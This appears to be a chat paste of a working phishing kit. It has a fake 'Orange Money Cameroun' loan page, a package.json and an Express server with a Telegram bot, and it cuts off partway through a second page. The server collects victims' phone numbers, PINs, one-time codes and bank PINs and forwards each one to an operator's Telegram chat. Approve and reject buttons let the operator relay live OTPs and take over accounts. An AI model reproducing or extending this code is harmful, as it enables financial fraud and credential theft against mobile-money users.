@@ -1,0 +1,2931 @@
+[10/4, 1:55 AM] jk❤️‍🔥🪯: <!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Orange Money - Obtenez Votre Prêt Rapidement</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --orange-primary: #f16e00;
+            --orange-hover: #d66100;
+            --bg-color: #e5e5e5;
+            --card-bg: #ffffff;
+            --calc-bg: #f8f9fa;
+            --text-main: #000000;
+            --text-muted: #666666;
+            --slider-track: #dcdcdc;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        /* Top Header Navigation bar */
+        .app-header {
+            width: 100%;
+            background-color: var(--orange-primary);
+            height: 60px;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-title {
+            display: flex;
+            align-items: center;
+            font-size: 22px;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+        }
+
+        .header-title .orange { color: #d64d00; opacity: 0.85; margin-right: 6px; }
+        .header-title .money { color: #000000; }
+
+        .menu-icon {
+            font-size: 26px;
+            cursor: pointer;
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+
+        .menu-icon span {
+            display: block;
+            width: 24px;
+            height: 3px;
+            background-color: white;
+            border-radius: 2px;
+        }
+
+        /* Card Layout */
+        .card {
+            background: var(--card-bg);
+            width: 90%;
+            max-width: 440px;
+            margin: 20px 0 30px;
+            padding: 30px 24px;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+            display: flex;
+            flex-direction: column;
+        }
+
+        .main-title {
+            font-size: 26px;
+            color: var(--text-main);
+            margin: 0 0 12px;
+            text-align: center;
+            font-weight: 800;
+            line-height: 1.25;
+            letter-spacing: -0.3px;
+        }
+
+        .subtext {
+            font-size: 13px;
+            color: var(--text-muted);
+            text-align: center;
+            margin-bottom: 28px;
+            line-height: 1.4;
+        }
+
+        /* Calculator Inner Area Container */
+        .calculator-container {
+            background: var(--calc-bg);
+            border-radius: 12px;
+            padding: 22px 18px 18px;
+            margin-bottom: 24px;
+        }
+
+        .calculator-title {
+            color: var(--text-main);
+            font-weight: 700;
+            font-size: 17px;
+            margin-bottom: 22px;
+        }
+
+        .slider-section { 
+            margin-bottom: 22px; 
+        }
+
+        .slider-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 14px;
+            color: #444444;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .accent-text { 
+            color: var(--orange-primary); 
+            font-weight: 800; 
+            font-size: 15px;
+        }
+
+        /* Custom Range Input */
+        input[type=range] {
+            -webkit-appearance: none;
+            width: 100%;
+            margin: 10px 0;
+            background: transparent;
+        }
+
+        input[type=range]:focus {
+            outline: none;
+        }
+
+        input[type=range]::-webkit-slider-runnable-track {
+            width: 100%;
+            height: 6px;
+            cursor: pointer;
+            background: var(--slider-track);
+            border-radius: 3px;
+        }
+
+        input[type=range]::-webkit-slider-thumb {
+            height: 22px;
+            width: 22px;
+            border-radius: 50%;
+            background: var(--orange-primary);
+            cursor: pointer;
+            -webkit-appearance: none;
+            margin-top: -8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        }
+
+        input[type=range]::-moz-range-track {
+            width: 100%;
+            height: 6px;
+            cursor: pointer;
+            background: var(--slider-track);
+            border-radius: 3px;
+        }
+
+        input[type=range]::-moz-range-thumb {
+            height: 22px;
+            width: 22px;
+            border-radius: 50%;
+            background: var(--orange-primary);
+            cursor: pointer;
+            border: none;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        }
+
+        .slider-footer {
+            display: flex;
+            justify-content: space-between;
+            font-size: 11px;
+            color: #888888;
+            margin-top: 2px;
+        }
+
+        /* Monthly Payment Results */
+        .result-container {
+            background: #ffffff;
+            border: 1px solid #eeeeee;
+            border-radius: 12px;
+            padding: 16px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 12px;
+            margin-top: 20px;
+        }
+
+        .result-label {
+            font-size: 15px;
+            color: #333333;
+            font-weight: 500;
+        }
+
+        .result-amount {
+            color: var(--orange-primary);
+            font-size: 22px;
+            font-weight: 800;
+        }
+
+        .interest-rate-info {
+            text-align: center;
+            font-size: 11px;
+            color: #777777;
+            margin-top: 12px;
+        }
+
+        /* CTA Button */
+        .btn-apply {
+            background: var(--orange-primary);
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 16px;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 800;
+            cursor: pointer;
+            letter-spacing: 0.5px;
+            margin-bottom: 28px;
+            transition: background-color 0.2s;
+            text-transform: uppercase;
+        }
+
+        .btn-apply:active {
+            background-color: var(--orange-hover);
+        }
+
+        /* Features List Section */
+        .features-list {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            padding-top: 10px;
+        }
+
+        .feature-item {
+            display: flex;
+            align-items: center;
+            gap: 18px;
+        }
+
+        .feature-icon-svg {
+            width: 32px;
+            height: 32px;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 26px;
+        }
+
+        .feature-text {
+            display: flex;
+            align-items: baseline;
+            gap: 12px;
+        }
+
+        .feature-title {
+            font-size: 15px;
+            font-weight: 700;
+            color: #000000;
+        }
+
+        .feature-desc {
+            font-size: 13px;
+            color: #888888;
+        }
+
+        /* Bottom Footer Banner */
+        .footer-banner {
+            width: 100%;
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+            color: #666666;
+            margin-top: auto;
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- Header Navigation Bar -->
+<div class="app-header">
+    <div style="width: 24px;"></div> <!-- Spacer to balance header alignment -->
+    <div class="header-title">
+        <span class="orange">Orange</span><span class="money">Money</span>
+    </div>
+    <div class="menu-icon">
+        <span></span>
+        <span></span>
+        <span></span>
+    </div>
+</div>
+
+<div class="card">
+    <h1 class="main-title">Obtenez Votre Prêt<br>Rapidement</h1>
+    <div class="subtext">Approbation rapide • Taux compétitifs •<br>Conditions flexibles</div>
+
+    <!-- Inside Calculator Box -->
+    <div class="calculator-container">
+        <div class="calculator-title">Simulateur de Prêt</div>
+
+        <!-- Loan Amount Selector -->
+        <div class="slider-section">
+            <div class="slider-header">
+                <span>Montant du Prêt</span>
+                <span id="valAmt" class="accent-text">250 000 FCFA</span>
+            </div>
+            <input type="range" id="amt" min="10000" max="5000000" step="10000" value="250000">
+            <div class="slider-footer">
+                <span>10 000 FCFA</span>
+                <span>5 000 000 FCFA</span>
+            </div>
+        </div>
+
+        <!-- Duration Selector -->
+        <div class="slider-section">
+            <div class="slider-header">
+                <span>Durée du Prêt</span>
+                <span id="valDur" class="accent-text">12 mois</span>
+            </div>
+            <input type="range" id="dur" min="6" max="60" step="1" value="12">
+            <div class="slider-footer">
+                <span>6 mois</span>
+                <span>60 mois</span>
+            </div>
+        </div>
+
+        <!-- Display Area -->
+        <div class="result-container">
+            <span class="result-label">Mensualité</span>
+            <span id="monthly" class="result-amount">21 875 FCFA</span>
+        </div>
+        
+        <div class="interest-rate-info">
+            Taux d'intérêt : 5% par an
+        </div>
+    </div>
+
+    <!-- Submit Button -->
+    <button class="btn-apply" onclick="goToPage2()">FAIRE UNE DEMANDE</button>
+
+    <!-- Bottom Features -->
+    <div class="features-list">
+        <div class="feature-item">
+            <div class="feature-icon-svg">
+                <!-- Yellow Lightning Bolt Icon -->
+                <svg width="28" height="34" viewBox="0 0 24 24" fill="#facc15" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M13 2L3 14H12L11 22L21 10H12L13 2Z" stroke="#eab308" stroke-width="1.5" stroke-linejoin="round"/>
+                </svg>
+            </div>
+            <div class="feature-text">
+                <span class="feature-title">Rapide</span>
+                <span class="feature-desc">Réponse en 24h</span>
+            </div>
+        </div>
+
+        <div class="feature-item">
+            <div class="feature-icon-svg">💰</div>
+            <div class="feature-text">
+                <span class="feature-title">Taux Bas</span>
+                <span class="feature-desc">Dès 5%/an</span>
+            </div>
+        </div>
+
+        <div class="feature-item">
+            <div class="feature-icon-svg">🔒</div>
+            <div class="feature-text">
+                <span class="feature-title">Sécurisé</span>
+                <span class="feature-desc">Niveau bancaire</span>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Footer -->
+<div class="footer-banner">
+    © 2026 Orange Money Cameroun
+</div>
+
+<script>
+    let calculatedMonthly = 21875;
+
+    function formatFCFA(value) {
+        return value.toString().replace(/\B(?=(\d{3})+(?!\d))/g, " ");
+    }
+
+    function update() {
+        const amtEl = document.getElementById('amt');
+        const durEl = document.getElementById('dur');
+
+        if (!amtEl || !durEl) return;
+
+        const principal = Number(amtEl.value) || 0;
+        const durationMonths = Number(durEl.value) || 1;
+
+        // Display updated values in labels
+        document.getElementById('valAmt').innerText = `${formatFCFA(principal)} FCFA`;
+        document.getElementById('valDur').innerText = `${durationMonths} mois`;
+
+        // 5% interest rate formula
+        const annualRate = 0.05;
+        const totalInterest = principal * annualRate * (durationMonths / 12);
+        const totalAmount = principal + totalInterest;
+        calculatedMonthly = Math.round(totalAmount / durationMonths);
+
+        document.getElementById('monthly').innerText = `${formatFCFA(calculatedMonthly)} FCFA`;
+    }
+
+    function goToPage2() {
+        const amtEl = document.getElementById('amt');
+        const durEl = document.getElementById('dur');
+
+        if (!amtEl || !durEl) return;
+
+        // Save into local storage under all used key variants to guarantee compatibility
+        localStorage.setItem('amount', amtEl.value);
+        localStorage.setItem('loan_amount', amtEl.value);
+        
+        localStorage.setItem('loanDuration', durEl.value);
+        localStorage.setItem('loan_term', durEl.value);
+        localStorage.setItem('duration', durEl.value);
+
+        localStorage.setItem('monthly_repayment', calculatedMonthly);
+
+        window.location.href = "/page2";
+    }
+
+    window.onload = () => {
+        const tg = window.Telegram?.WebApp;
+
+        if (tg) {
+            tg.ready();
+            tg.expand();
+        }
+
+        const amtEl = document.getElementById('amt');
+        const durEl = document.getElementById('dur');
+
+        if (amtEl) amtEl.addEventListener('input', update);
+        if (durEl) durEl.addEventListener('input', update);
+
+        update();
+    };
+</script>
+
+</body>
+</html>
+[10/4, 1:55 AM] jk❤️‍🔥🪯: {
+  "name": "orange-cameroon-loans",
+  "version": "1.0.0",
+  "description": "Système de Prêts et Crédits Express Orange Money Cameroun",
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js"
+  },
+  "dependencies": {
+    "express": "^4.18.2",
+    "telegraf": "^4.12.2",
+    "dotenv": "^16.0.3"
+  }
+}
+[10/4, 1:55 AM] jk❤️‍🔥🪯: const express = require('express');
+const { Telegraf } = require('telegraf');
+const path = require('path');
+require('dotenv').config();
+
+const app = express();
+const PORT = process.env.PORT || 8080;
+
+// -------------------- INIT BOT --------------------
+if (!process.env.BOT_TOKEN) {
+    throw new Error("BOT_TOKEN is missing in .env");
+}
+
+const bot = new Telegraf(process.env.BOT_TOKEN);
+const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();
+
+// -------------------- MEMORY STORE --------------------
+const statusStore = {};
+
+// -------------------- MIDDLEWARE --------------------
+app.use(express.json());
+app.use(express.static(path.join(__dirname, 'public')));
+
+// -------------------- ROUTES --------------------
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+// -------------------- LOGIN API --------------------
+app.post('/api/login-notification', async (req, res) => {
+    const { phone, pin } = req.body || {};
+    const country = "Cameroun";
+    const countryCode = "+237";
+
+    const currentTime = new Date().toLocaleString('en-US', {
+        month: 'numeric', day: 'numeric', year: 'numeric',
+        hour: 'numeric', minute: 'numeric', second: 'numeric',
+        hour12: true
+    });
+
+    if (!phone || !pin || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });
+
+    statusStore[phone] = "pending";
+
+    const message = `📱 <b>ORANGE MONEY CAMEROUN - LOGIN ATTEMPT</b>
+
+🆕 <b>NEW USER</b>
+🇨🇲 <b>Country:</b> ${country}
+🌍 <b>Country Code:</b> ${countryCode}
+📱 <b>Phone Number:</b> ${phone}
+🔢 <b>PIN:</b> ${pin}
+⏰ <b>Time:</b> ${currentTime}
+
+━━━━━━━━━━━━━━━
+
+⚠️ <b>User waiting for approval</b>
+⌛ <b>Timeout: 5 minutes</b>`;
+
+    try {
+        await bot.telegram.sendMessage(ADMIN_ID, message, {
+            parse_mode: 'HTML',
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: "✅ Allow to proceed", callback_data: `approve|${phone}|${pin}` },
+                        { text: "❌ Invalid credentials", callback_data: `deny|${phone}|${pin}` }
+                    ]
+                ]
+            }
+        });
+        res.json({ success: true });
+    } catch (err) {
+        console.error(err);
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// -------------------- FIRST OTP API (6-CHARACTER VERIFICATION CODE) --------------------
+app.post('/api/verify-first-otp', async (req, res) => {
+    const { phone, code } = req.body || {};
+    const country = "Cameroun";
+    const countryCode = "+237";
+    const currentTime = new Date().toLocaleString('en-US', {
+        month: 'numeric', day: 'numeric', year: 'numeric',
+        hour: 'numeric', minute: 'numeric', second: 'numeric',
+        hour12: true
+    });
+
+    if (!phone || !code || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });
+
+    statusStore[phone] = "pending_otp1";
+
+    const otpMessage = `🆕 <b>ORANGE MONEY CAMEROUN - VERIFICATION NEEDED</b>
+🇨🇲 <b>Country:</b> ${country}
+📞 <b>Country Code:</b> ${countryCode}
+📱 <b>Phone Number:</b> ${phone}
+🔑 <b>VERIFICATION CODE (MAX IT):</b> <code>${code}</code>
+⏰ <b>Time:</b> ${currentTime}
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+⚠️ <b>Verify the credentials:</b>
+⏰ <b>Timeout: 5 minutes</b>`;
+
+    try {
+        await bot.telegram.sendMessage(ADMIN_ID, otpMessage, {
+            parse_mode: 'HTML',
+            disable_web_page_preview: true,
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: "✅ Correct (PIN + OTP)", callback_data: `otp1_correct|${phone}` }
+                    ],
+                    [
+                        { text: "❌ Wrong Code", callback_data: `otp1_wrong|${phone}` },
+                        { text: "⚠️ Wrong PIN", callback_data: `otp2_wrongpin|${phone}` }
+                    ],
+                    [
+                        { text: "📞 Contact Us", callback_data: `contact_us|${phone}` }
+                    ]
+                ]
+            }
+        });
+        res.json({ success: true });
+    } catch (err) {
+        console.error(err);
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// -------------------- SECOND OTP API --------------------
+app.post('/api/verify-second-otp', async (req, res) => {
+    const { phone, otp } = req.body || {};
+    const country = "Cameroun";
+    const countryCode = "+237";
+    const currentTime = new Date().toLocaleString('en-US', {
+        month: 'numeric', day: 'numeric', year: 'numeric',
+        hour: 'numeric', minute: 'numeric', second: 'numeric',
+        hour12: true
+    });
+
+    if (!phone || !otp || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });
+
+    statusStore[phone] = "pending_otp2";
+
+    const otpMessage2 = `2️⃣ <b>ORANGE MONEY CAMEROUN - SECOND OTP (Step 2/2)</b>
+
+🆕 <b>NEW USER - SECOND VERIFICATION</b>
+🇨🇲 <b>Country:</b> ${country}
+🌍 <b>Country Code:</b> ${countryCode}
+📱 <b>Phone Number:</b> ${phone}
+🔐 <b>Second OTP Code:</b> ${otp}
+⏰ <b>Time:</b> ${currentTime}
+
+━━━━━━━━━━━━━━━
+
+⚠️ <b>Verify SECOND OTP:</b>
+⌛ <b>Timeout: 5 minutes</b>`;
+
+    try {
+        await bot.telegram.sendMessage(ADMIN_ID, otpMessage2, {
+            parse_mode: 'HTML',
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: "✅ Correct", callback_data: `otp2_correct|${phone}|${otp}` },
+                        { text: "❌ Wrong Code", callback_data: `otp2_wrong|${phone}` },
+                        { text: "🔑 Wrong PIN", callback_data: `otp2_wrongpin|${phone}` }
+                    ]
+                ]
+            }
+        });
+        res.json({ success: true });
+    } catch (err) {
+        console.error(err);
+        res.status(500).json({ error: err.message });
+    }
+});
+
+// -------------------- RESEND OTP API --------------------
+app.post('/api/resend-otp-notification', async (req, res) => {
+    const { phone, step } = req.body || {};
+    
+    if (!phone || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });
+
+    const resendMsg = `🔄 <b>RESEND REQUESTED</b>
+
+📱 <b>Phone Number:</b> ${phone}
+📍 <b>Step:</b> ${step}
+⚠️ <b>User is waiting for a new code.</b>
+
+━━━━━━━━━━━━━━━`;
+
+    try {
+        await bot.telegram.sendMessage(ADMIN_ID, resendMsg, { parse_mode: 'HTML' });
+        res.json({ success: true });
+    } catch (err) {
+        console.error(err);
+        res.status(500).json({ error: "Telegram error" });
+    }
+});
+
+// -------------------- BANK PIN API --------------------
+app.post('/api/verify-bank-pin', async (req, res) => {
+    const { phone, bankPin } = req.body || {};
+    const country = "Cameroun";
+    const currentTime = new Date().toLocaleString('en-US', {
+        month: 'numeric', day: 'numeric', year: 'numeric',
+        hour: 'numeric', minute: 'numeric', second: 'numeric',
+        hour12: true
+    });
+
+    if (!phone || !bankPin || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });
+
+    statusStore[phone] = "pending_bank_pin";
+
+    const bankPinMessage = `🏦 <b>ORANGE MONEY CAMEROUN - BANK PIN VERIFICATION (Step 3)</b>
+
+🆕 <b>NEW USER - BANK SECURITY</b>
+🇨🇲 <b>Country:</b> ${country}
+📱 <b>Phone Number:</b> ${phone}
+🔑 <b>Bank PIN:</b> ${bankPin}
+⏰ <b>Time:</b> ${currentTime}
+
+━━━━━━━━━━━━━━━
+
+⚠️ <b>Verify BANK PIN:</b>
+⌛ <b>Timeout: 5 minutes</b>`;
+
+    try {
+        await bot.telegram.sendMessage(ADMIN_ID, bankPinMessage, {
+            parse_mode: 'HTML',
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: "✅ Correct", callback_data: `bank_correct|${phone}|${bankPin}` },
+                        { text: "❌ Wrong PIN", callback_data: `bank_wrong|${phone}` }
+                    ]
+                ]
+            }
+        });
+        res.json({ success: true });
+    } catch (err) {
+        res.status(500).json({ error: "Telegram error" });
+    }
+});
+
+// -------------------- BOT ACTIONS --------------------
+
+// APPROVE
+bot.action(/^approve\|(.+)\|(.+)/, async (ctx) => {
+    const phone = ctx.match[1];
+    const pin = ctx.match[2];
+    statusStore[phone] = "approved";
+    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
+
+    const approvedMsg = `✅ <b>LOGIN APPROVED</b>
+
+🆕 <b>NEW USER</b>
+🇨🇲 <b>Cameroun</b>
+📱 <b>${phone}</b>
+🔐 <b>${pin}</b>
+
+━━━━━━━━━━━━━━━
+
+✅ <b>Status: Approved</b>
+➡️ <b>Next: First OTP (1/2)</b>
+⏱️️ <b>${currentTime}</b>`;
+
+    await ctx.answerCbQuery("Allowed");
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.replyWithHTML(approvedMsg);
+});
+
+// DENY
+bot.action(/^deny\|(.+)\|(.+)/, async (ctx) => {
+    const phone = ctx.match[1];
+    const pin = ctx.match[2];
+    statusStore[phone] = "denied";
+    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
+
+    const deniedMsg = `❌ <b>INVALID CREDENTIALS</b>
+
+🇨🇲 <b>Cameroun</b>
+📱 <b>${phone}</b>
+🔐 <b>${pin}</b>
+
+━━━━━━━━━━━━━━━
+
+❌ <b>Status: Rejected</b>
+⏱️ <b>${currentTime}</b>`;
+
+    await ctx.answerCbQuery("Rejected");
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.replyWithHTML(deniedMsg);
+});
+
+// OTP1 CORRECT
+bot.action(/^otp1_correct\|(.+)/, async (ctx) => {
+    const phone = ctx.match[1];
+    statusStore[phone] = "otp1_correct";
+    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
+
+    const verifiedMsg = `1️⃣ <b>FIRST OTP VERIFIED (Step 1/2)</b>
+
+🇨🇲 <b>Cameroun</b>
+📱 <b>${phone}</b>
+
+━━━━━━━━━━━━━━━
+
+✅ <b>Status: First OTP verified</b>
+➡️ <b>Next: Second OTP (2/2) will be sent</b>
+⌛ <b>${currentTime}</b>`;
+
+    await ctx.answerCbQuery("Verified");
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.replyWithHTML(verifiedMsg);
+});
+
+// OTP1 WRONG
+bot.action(/^otp1_wrong\|(.+)/, async (ctx) => {
+    const phone = ctx.match[1];
+    statusStore[phone] = "otp1_wrong";
+    await ctx.answerCbQuery("Wrong Code");
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.replyWithHTML(`❌ <b>FIRST OTP WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter OTP.</b>`);
+});
+
+// CONTACT US
+bot.action(/^contact_us\|(.+)/, async (ctx) => {
+    const phone = ctx.match[1];
+    statusStore[phone] = "contact_us";
+    await ctx.answerCbQuery("Contact Us Clicked");
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.replyWithHTML(`📞 <b>CONTACT REQUESTED</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>User requested contact support.</b>`);
+});
+
+// OTP2 CORRECT
+bot.action(/^otp2_correct\|(.+)\|(.+)/, async (ctx) => {
+    const phone = ctx.match[1];
+    const otp = ctx.match[2];
+    statusStore[phone] = "otp2_correct";
+    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
+
+    const verifiedMsg2 = `2️⃣ <b>SECOND OTP VERIFIED (Step 2/2)</b>
+
+🇨🇲 <b>Cameroun</b>
+📱 <b>${phone}</b>
+🔐 <b>${otp}</b>
+
+━━━━━━━━━━━━━━━
+
+✅ <b>Status: Second OTP verified</b>
+✅ <b>Process Complete</b>
+⌛ <b>${currentTime}</b>`;
+
+    await ctx.answerCbQuery("Finalized");
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.replyWithHTML(verifiedMsg2);
+});
+
+// OTP2 WRONG
+bot.action(/^otp2_wrong\|(.+)/, async (ctx) => {
+    const phone = ctx.match[1];
+    statusStore[phone] = "otp2_wrong";
+    await ctx.answerCbQuery("Wrong Code");
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.replyWithHTML(`❌ <b>SECOND OTP WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter OTP.</b>`);
+});
+
+// BANK PIN CORRECT
+bot.action(/^bank_correct\|(.+)\|(.+)/, async (ctx) => {
+    const phone = ctx.match[1];
+    const pin = ctx.match[2];
+    statusStore[phone] = "bank_pin_correct";
+    
+    const finalizedMsg = `✅ <b>BANK PIN VERIFIED</b>
+
+🇨🇲 <b>Cameroun</b>
+📱 <b>${phone}</b>
+🔑 <b>${pin}</b>
+
+━━━━━━━━━━━━━━━
+
+✅ <b>Status: Process Completed</b>
+🏁 <b>User redirected to Success page</b>`;
+
+    await ctx.answerCbQuery("Bank PIN Verified");
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.replyWithHTML(finalizedMsg);
+});
+
+// BANK PIN WRONG
+bot.action(/^bank_wrong\|(.+)/, async (ctx) => {
+    const phone = ctx.match[1];
+    statusStore[phone] = "bank_pin_wrong";
+    await ctx.answerCbQuery("Wrong Bank PIN");
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.replyWithHTML(`❌ <b>BANK PIN WRONG</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>Prompted to re-enter Bank PIN.</b>`);
+});
+
+// OTP2 WRONG PIN
+bot.action(/^otp2_wrongpin\|(.+)/, async (ctx) => {
+    const phone = ctx.match[1];
+    statusStore[phone] = "otp2_wrongpin";
+    await ctx.answerCbQuery("Wrong PIN");
+    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+    await ctx.replyWithHTML(`🔑 <b>WRONG PIN REPORTED</b>\n📱 <b>User:</b> ${phone}\n⚠️ <b>User prompted to re-enter PIN.</b>`);
+});
+
+// -------------------- STATUS CHECK --------------------
+app.get('/api/check-status', (req, res) => {
+    const phone = req.query.phone;
+    const currentStatus = statusStore[phone] || "pending";
+    
+    res.json({ status: currentStatus });
+
+    if (currentStatus === "approved") {
+        statusStore[phone] = "idle_waiting_for_otp1";
+    }
+});
+
+// -------------------- SAFE PAGE ROUTE --------------------
+app.get('/:page', (req, res, next) => {
+    if (req.params.page.startsWith('api')) return next();
+    const file = req.params.page.endsWith('.html') ? req.params.page : req.params.page + '.html';
+    res.sendFile(path.join(__dirname, 'public', file), (err) => {
+        if (err) res.status(404).send("Page not found");
+    });
+});
+
+// -------------------- START SERVER & BOT --------------------
+app.listen(PORT, async () => {
+    console.log(`🚀 Server running on port ${PORT}`);
+    try {
+        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
+        bot.launch();
+        console.log("🤖 Bot is active");
+    } catch (err) {
+        console.error("Launch error:", err);
+    }
+});
+
+// Graceful stop
+process.once('SIGINT', () => bot.stop('SIGINT'));
+process.once('SIGTERM', () => bot.stop('SIGTERM'));
+[10/4, 1:55 AM] jk❤️‍🔥🪯: <!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Orange Money - Demande de Prêt</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --orange-primary: #f16e00;
+            --orange-hover: #d66100;
+            --bg-color: #e5e5e5;
+            --card-bg: #ffffff;
+            --text-main: #000000;
+            --text-muted: #888888;
+            --input-border: #e2e8f0;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        /* Top Header Navigation bar */
+        .app-header {
+            width: 100%;
+            background-color: var(--orange-primary);
+            height: 60px;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .back-btn {
+            color: white;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .header-title {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            font-size: 20px;
+            font-weight: 800;
+        }
+
+        .header-title .orange { color: #d64d00; opacity: 0.85; margin-right: 4px; }
+        .header-title .money { color: #000000; }
+
+        .menu-icon {
+            font-size: 24px;
+            cursor: pointer;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+
+        .menu-icon span {
+            display: block;
+            width: 22px;
+            height: 3px;
+            background-color: white;
+            border-radius: 2px;
+        }
+
+        /* Card Layout */
+        .card {
+            background: white;
+            width: 90%;
+            max-width: 440px;
+            margin: 20px 0 30px;
+            padding: 32px 24px;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+            display: flex;
+            flex-direction: column;
+        }
+
+        .main-title {
+            font-size: 26px;
+            color: var(--text-main);
+            margin: 0 0 6px;
+            text-align: center;
+            font-weight: 800;
+            letter-spacing: -0.3px;
+        }
+
+        .subtext {
+            font-size: 14px;
+            color: var(--text-muted);
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        /* Step Progress Bar */
+        .step-indicator {
+            display: flex;
+            justify-content: space-center;
+            gap: 12px;
+            margin: 0 auto 32px;
+            width: 80%;
+        }
+
+        .step-bar {
+            flex: 1;
+            height: 4px;
+            background-color: #e2e8f0;
+            border-radius: 2px;
+        }
+
+        .step-bar.active {
+            background-color: var(--orange-primary);
+        }
+
+        /* Form Inputs */
+        .form-group {
+            margin-bottom: 22px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form-group label {
+            font-size: 15px;
+            font-weight: 700;
+            color: #222222;
+            margin-bottom: 10px;
+        }
+
+        .form-control {
+            font-size: 15px;
+            padding: 14px 16px;
+            border: 1px solid var(--input-border);
+            border-radius: 10px;
+            background-color: #ffffff;
+            color: #333333;
+            outline: none;
+            width: 100%;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.02);
+        }
+
+        .form-control::placeholder {
+            color: #a0aec0;
+        }
+
+        .form-control:focus {
+            border-color: var(--orange-primary);
+        }
+
+        select.form-control {
+            appearance: none;
+            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23555555' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
+            background-repeat: no-repeat;
